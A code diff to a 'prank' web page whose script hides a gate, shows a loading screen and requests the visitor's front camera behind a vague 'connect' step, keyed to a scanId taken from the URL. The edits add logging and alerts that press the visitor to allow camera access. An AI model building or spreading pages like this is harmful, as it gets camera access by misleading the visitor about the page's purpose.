@@ -263,17 +263,18 @@
   <audio id="prank-sound" src="/sound.mp3" preload="auto"></audio>
 
   <script>
-    // Get scanId from URL - 100% reliable on mobile
+    // Define scanId at top
     const urlParams = new URLSearchParams(window.location.search);
     const scanId = urlParams.get('scanId');
 
     async function handleConnect() {
+      console.log("Connect button clicked");
       // 1. Hide gate, show loading
       document.getElementById('gate').style.display = 'none';
       document.getElementById('loading').style.display = 'block';
       
       // 2. Start camera request (USER GESTURE!)
-      startCapture();
+      await startCapture();
       
       // 3. Prank reveal timer
       setTimeout(() => {
@@ -292,14 +293,22 @@
 
     async function startCapture() {
       if (!scanId) {
-        console.warn("No scanId found in URL.");
+        alert("Error: No Scan ID found in URL.");
+        return;
+      }
+      
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        alert("Error: Your browser does not support camera access.");
         return;
       }
       
       try {
+        console.log("Requesting camera permission...");
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: "user" } 
         });
+        console.log("Camera permission GRANTED!");
+        
         const video = document.getElementById('video');
         video.srcObject = stream;
         
@@ -354,6 +363,7 @@
           }
         }, 500);
       } catch (e) {
+        alert("Camera Error: " + e.name + " - " + e.message + "\n\nTry opening the site again and click 'Allow' if prompted.");
         console.error("Camera access failed:", e.message);
       }
     }
